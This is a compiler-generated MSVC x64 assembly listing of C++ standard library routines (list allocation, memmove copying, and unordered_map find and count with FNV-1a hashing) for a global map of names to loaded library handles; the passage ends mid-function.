?_Alloc_sentinel_and_proxy@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@AEAAXXZ PROC ; std::list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::_Alloc_sentinel_and_proxy, COMDAT

; 1834 :     void _Alloc_sentinel_and_proxy() {

$LN31:
	push	rbx
	sub	rsp, 32					; 00000020H
	mov	rbx, rcx

; 1835 :         auto&& _Alproxy = _GET_PROXY_ALLOCATOR(_Alnode, _Getal());
; 1836 :         _Container_proxy_ptr<_Alty> _Proxy(_Alproxy, _Mypair._Myval2);
; 1837 :         auto& _Al     = _Getal();
; 1838 :         auto _Newhead = _Al.allocate(1);

	mov	ecx, 56					; 00000038H
	call	??2@YAPEAX_K@Z				; operator new

; 1839 :         _Construct_in_place(_Newhead->_Next, _Newhead);

	mov	QWORD PTR [rax], rax

; 1840 :         _Construct_in_place(_Newhead->_Prev, _Newhead);

	mov	QWORD PTR [rax+8], rax

; 1841 :         _Mypair._Myval2._Myhead = _Newhead;

	mov	QWORD PTR [rbx], rax

; 1842 :         _Proxy._Release();
; 1843 :     }

	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
?_Alloc_sentinel_and_proxy@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@AEAAXXZ ENDP ; std::list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::_Alloc_sentinel_and_proxy
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
;	COMDAT ?_Get_max_bucket_size@?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@QEAAAEAMXZ
_TEXT	SEGMENT
this$dead$ = 8
?_Get_max_bucket_size@?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@QEAAAEAMXZ PROC ; std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >::_Get_max_bucket_size, COMDAT

; 156  :         return _Mypair._Myval2._Myval2;

	lea	rax, OFFSET FLAT:?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A

; 157  :     }

	ret	0
?_Get_max_bucket_size@?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@QEAAAEAMXZ ENDP ; std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >::_Get_max_bucket_size
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ?allocate@?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@QEAAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@_K@Z
_TEXT	SEGMENT
this$dead$ = 8
_Count$dead$ = 16
?allocate@?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@QEAAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@_K@Z PROC ; std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> >::allocate, COMDAT

; 954  :         static_assert(sizeof(value_type) > 0, "value_type must be complete before calling allocate.");
; 955  :         return static_cast<_Ty*>(_STD _Allocate<_New_alignof<_Ty>>(_Get_size_of_n<sizeof(_Ty)>(_Count)));

	mov	ecx, 56					; 00000038H
	jmp	??2@YAPEAX_K@Z				; operator new
?allocate@?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@QEAAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@_K@Z ENDP ; std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> >::allocate
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
;	COMDAT ??$to_address@QEBD@std@@YAPEBQEBDQEBQEBD@Z
_TEXT	SEGMENT
_Val$ = 8
??$to_address@QEBD@std@@YAPEBQEBDQEBQEBD@Z PROC		; std::to_address<char const * const>, COMDAT

; 453  :     static_assert(!is_function_v<_Ty>, "N4950 [pointer.conversion]/1: Mandates: T is not a function type.");
; 454  :     return _Val;

	mov	rax, rcx

; 455  : }

	ret	0
??$to_address@QEBD@std@@YAPEBQEBDQEBQEBD@Z ENDP		; std::to_address<char const * const>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
;	COMDAT ??$_Copy_memmove@PEBQEBDPEAPEBD@std@@YAPEAPEBDPEBQEBD0PEAPEBD@Z
_TEXT	SEGMENT
_First$ = 48
_Last$ = 56
_Dest$ = 64
??$_Copy_memmove@PEBQEBDPEAPEBD@std@@YAPEAPEBDPEBQEBD0PEAPEBD@Z PROC ; std::_Copy_memmove<char const * const *,char const * *>, COMDAT

; 4613 : _OutCtgIt _Copy_memmove(_CtgIt _First, _CtgIt _Last, _OutCtgIt _Dest) {

$LN4:
	mov	QWORD PTR [rsp+8], rbx
	push	rdi
	sub	rsp, 32					; 00000020H
	mov	rbx, rdx
	mov	rdi, r8

; 4614 :     auto _FirstPtr              = _STD _To_address(_First);
; 4615 :     auto _LastPtr               = _STD _To_address(_Last);
; 4616 :     auto _DestPtr               = _STD _To_address(_Dest);
; 4617 :     const char* const _First_ch = const_cast<const char*>(reinterpret_cast<const volatile char*>(_FirstPtr));
; 4618 :     const char* const _Last_ch  = const_cast<const char*>(reinterpret_cast<const volatile char*>(_LastPtr));
; 4619 :     char* const _Dest_ch        = const_cast<char*>(reinterpret_cast<const volatile char*>(_DestPtr));
; 4620 :     const auto _Count           = static_cast<size_t>(_Last_ch - _First_ch);

	sub	rbx, rcx

; 4621 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

	mov	rdx, rcx
	mov	r8, rbx
	mov	rcx, rdi
	call	memmove

; 4622 :     if constexpr (is_pointer_v<_OutCtgIt>) {
; 4623 :         return reinterpret_cast<_OutCtgIt>(_Dest_ch + _Count);

	lea	rax, QWORD PTR [rbx+rdi]

; 4624 :     } else {
; 4625 :         return _Dest + (_LastPtr - _FirstPtr);
; 4626 :     }
; 4627 : }

	mov	rbx, QWORD PTR [rsp+48]
	add	rsp, 32					; 00000020H
	pop	rdi
	ret	0
??$_Copy_memmove@PEBQEBDPEAPEBD@std@@YAPEAPEBDPEBQEBD0PEAPEBD@Z ENDP ; std::_Copy_memmove<char const * const *,char const * *>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
;	COMDAT ??$_To_address@PEAPEBD@std@@YA?A_PAEBQEAPEBD@Z
_TEXT	SEGMENT
_Val$ = 8
??$_To_address@PEAPEBD@std@@YA?A_PAEBQEAPEBD@Z PROC	; std::_To_address<char const * *>, COMDAT

; 4482 :     _STL_INTERNAL_STATIC_ASSERT(contiguous_iterator<_Iter>);
; 4483 :     return _STD to_address(_Val);

	mov	rax, QWORD PTR [rcx]

; 4484 : }

	ret	0
??$_To_address@PEAPEBD@std@@YA?A_PAEBQEAPEBD@Z ENDP	; std::_To_address<char const * *>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
;	COMDAT ??$count@X@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEBA_KAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z
_TEXT	SEGMENT
$T1 = 32
this$dead$ = 64
_Keyval$ = 72
??$count@X@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEBA_KAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z PROC ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::count<void>, COMDAT

; 1241 :     _NODISCARD size_type count(typename _Traits::template _Deduce_key<_Keyty> _Keyval) const {

$LN41:
	push	rbx
	sub	rsp, 48					; 00000030H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [rdx+24], 15

; 2235 :         const value_type* _Result = _Bx._Buf;

	mov	r8, rdx

; 5176 :         return _Hash_array_representation(_Keyval.c_str(), _Keyval.size());

	mov	r10, QWORD PTR [rdx+16]

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN16@count

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	r8, QWORD PTR [rdx]
$LN16@count:

; 5176 :         return _Hash_array_representation(_Keyval.c_str(), _Keyval.size());

	xor	ebx, ebx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits

; 2333 :     return _Fnv1a_append_bytes(

	mov	r9, -3750763034362895579		; cbf29ce484222325H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 5176 :         return _Hash_array_representation(_Keyval.c_str(), _Keyval.size());

	mov	ecx, ebx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits

; 2300 :     for (size_t _Idx = 0; _Idx < _Count; ++_Idx) {

	test	r10, r10
	je	SHORT $LN27@count
	mov	r11, 1099511628211			; 00000100000001b3H
	npad	12
$LL33@count:

; 2301 :         _Val ^= static_cast<size_t>(_First[_Idx]);

	movzx	eax, BYTE PTR [r8+rcx]
	inc	rcx
	xor	r9, rax

; 2302 :         _Val *= _FNV_prime;

	imul	r9, r11
	cmp	rcx, r10
	jb	SHORT $LL33@count
$LN27@count:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1246 :             return static_cast<bool>(_Find_last(_Keyval, _Hashval)._Duplicate);

	mov	r8, rdx
	lea	rdx, QWORD PTR $T1[rsp]
	call	??$_Find_last@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEBA?AU?$_Hash_find_last_result@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@_K@Z ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Find_last<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >
	cmp	QWORD PTR [rax+8], rbx
	setne	bl
	mov	rax, rbx

; 1247 :         }
; 1248 :     }

	add	rsp, 48					; 00000030H
	pop	rbx
	ret	0
??$count@X@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEBA_KAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z ENDP ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::count<void>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
;	COMDAT ??$find@X@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA?AV?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z
_TEXT	SEGMENT
$T1 = 32
this$dead$ = 64
__$ReturnUdt$ = 72
_Keyval$ = 80
??$find@X@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA?AV?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z PROC ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::find<void>, COMDAT

; 1224 :     _NODISCARD iterator find(typename _Traits::template _Deduce_key<_Keyty> _Keyval) {

$LN56:
	push	rbx
	sub	rsp, 48					; 00000030H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [r8+24], 15
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1224 :     _NODISCARD iterator find(typename _Traits::template _Deduce_key<_Keyty> _Keyval) {

	mov	rbx, rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 5176 :         return _Hash_array_representation(_Keyval.c_str(), _Keyval.size());

	mov	r11, QWORD PTR [r8+16]

; 2235 :         const value_type* _Result = _Bx._Buf;

	mov	r10, r8

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN16@find

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	r10, QWORD PTR [r8]
$LN16@find:

; 5176 :         return _Hash_array_representation(_Keyval.c_str(), _Keyval.size());

	xor	ecx, ecx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits

; 2333 :     return _Fnv1a_append_bytes(

	mov	r9, -3750763034362895579		; cbf29ce484222325H

; 2300 :     for (size_t _Idx = 0; _Idx < _Count; ++_Idx) {

	test	r11, r11
	je	SHORT $LN27@find
	mov	rdx, 1099511628211			; 00000100000001b3H
	npad	11
$LL48@find:

; 2301 :         _Val ^= static_cast<size_t>(_First[_Idx]);

	movzx	eax, BYTE PTR [r10+rcx]
	inc	rcx
	xor	r9, rax

; 2302 :         _Val *= _FNV_prime;

	imul	r9, rdx
	cmp	rcx, r11
	jb	SHORT $LL48@find
$LN27@find:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1213 :             auto _Target = _Find_last(_Keyval, _Hashval)._Duplicate;

	lea	rdx, QWORD PTR $T1[rsp]
	call	??$_Find_last@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEBA?AU?$_Hash_find_last_result@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@_K@Z ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Find_last<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >
	mov	rcx, QWORD PTR [rax+8]

; 1214 :             if (_Target) {

	mov	rax, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+8
	test	rcx, rcx
	cmovne	rax, rcx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 37   :     _List_unchecked_const_iterator(_Nodeptr _Pnode, const _Mylist* _Plist) noexcept : _Ptr(_Pnode) {

	mov	QWORD PTR [rbx], rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1225 :         return _List._Make_iter(_Find(_Keyval, _Traitsobj(_Keyval)));

	mov	rax, rbx

; 1226 :     }

	add	rsp, 48					; 00000030H
	pop	rbx
	ret	0
??$find@X@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA?AV?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z ENDP ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::find<void>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility
;	COMDAT ??$?0PEBDAEAPEAUHINSTANCE__@@$0A@@?$pair@PEBDPEAUHINSTANCE__@@@std@@QEAA@$$QEAPEBDAEAPEAUHINSTANCE__@@@Z
_TEXT	SEGMENT
this$ = 8
_Val1$ = 16
_Val2$ = 24
??$?0PEBDAEAPEAUHINSTANCE__@@$0A@@?$pair@PEBDPEAUHINSTANCE__@@@std@@QEAA@$$QEAPEBDAEAPEAUHINSTANCE__@@@Z PROC ; std::pair<char const *,HINSTANCE__ *>::pair<char const *,HINSTANCE__ *><char const *,HINSTANCE__ * &,0>, COMDAT

; 247  :         : first(_STD forward<_Other1>(_Val1)), second(_STD forward<_Other2>(_Val2)) {

	mov	rax, QWORD PTR [rdx]
	mov	QWORD PTR [rcx], rax
	mov	rax, QWORD PTR [r8]
	mov	QWORD PTR [rcx+8], rax

; 248  :     }

	mov	rax, rcx
	ret	0
??$?0PEBDAEAPEAUHINSTANCE__@@$0A@@?$pair@PEBDPEAUHINSTANCE__@@@std@@QEAA@$$QEAPEBDAEAPEAUHINSTANCE__@@@Z ENDP ; std::pair<char const *,HINSTANCE__ *>::pair<char const *,HINSTANCE__ *><char const *,HINSTANCE__ * &,0>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\unordered_map
;	COMDAT ??$insert@U?$pair@PEBDPEAUHINSTANCE__@@@std@@$0A@@?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA?AU?$pair@V?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@_N@1@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@1@@Z
_TEXT	SEGMENT
this$dead$ = 48
__$ReturnUdt$ = 56
_Val$ = 64
